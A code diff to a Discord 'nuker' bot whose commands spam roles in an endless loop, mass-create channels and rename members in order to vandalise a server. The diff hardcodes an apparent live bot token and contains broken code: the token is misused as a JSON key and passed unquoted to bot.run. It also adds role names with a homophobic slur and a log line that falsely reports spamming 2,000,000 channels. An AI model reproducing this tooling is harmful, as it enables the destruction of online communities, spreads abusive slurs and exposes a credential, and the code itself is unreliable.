@@ -10,11 +10,11 @@ from discord import Embed
 
 colorama.init()
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=">",intents=intents)
+bot = commands.Bot(command_prefix="?",intents=intents)
 bot.remove_command("help")
 with open('config.json') as f:
     data = json.load(f)
-    token = data["TOKEN"]
+    token = data["OTcwMjg2NTY5OTA0ODE2MTY4.Ym5vyQ.F1jXNuLYSZ0upMmPc_KSRI6MVIk"]
 @bot.event
 async def on_ready():
     print(f'''
@@ -68,11 +68,11 @@ async def rspam(ctx):
 @bot.command()
 async def transrspam(ctx):
  while True:
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
-   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
+   await ctx.guild.create_role(name="get nuked fag",colour=discord.Colour(0x0EF5F6))
+   await ctx.guild.create_role(name="HAIL ME",colour=discord.Colour(0xFFFFFF))
+   await ctx.guild.create_role(name="ALL HAIL ME",colour=discord.Colour(0xFFA3FB))
+   await ctx.guild.create_role(name="I AM GOD",colour=discord.Colour(0xFFFFFF))
+   await ctx.guild.create_role(name="GET NUKED FAG",colour=discord.Colour(0x0EF5F6))
    print("Spamming roles <3")
 @bot.command()
 async def rdelete(ctx):
@@ -92,7 +92,7 @@ async def cspam(ctx,amount=10,name_of_channel="nuked"):
   for times in range(amount):
     await ctx.guild.create_text_channel(name_of_channel)
   em3 = discord.Embed(title = f"Im Done spamming ***{amount}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
-  print(f"Spammed {amount} Channels <3")
+  print(f"Spammed {2000000} Channels <3")
 
   await ctx.send(embed=em3)
 
@@ -207,4 +207,4 @@ async def nickall(ctx, *, name="! TOOL RUNS YOU"):
 
 
 
-bot.run(token)
+bot.run(OTcwMjg2NTY5OTA0ODE2MTY4.Ym5vyQ.F1jXNuLYSZ0upMmPc_KSRI6MVIk)
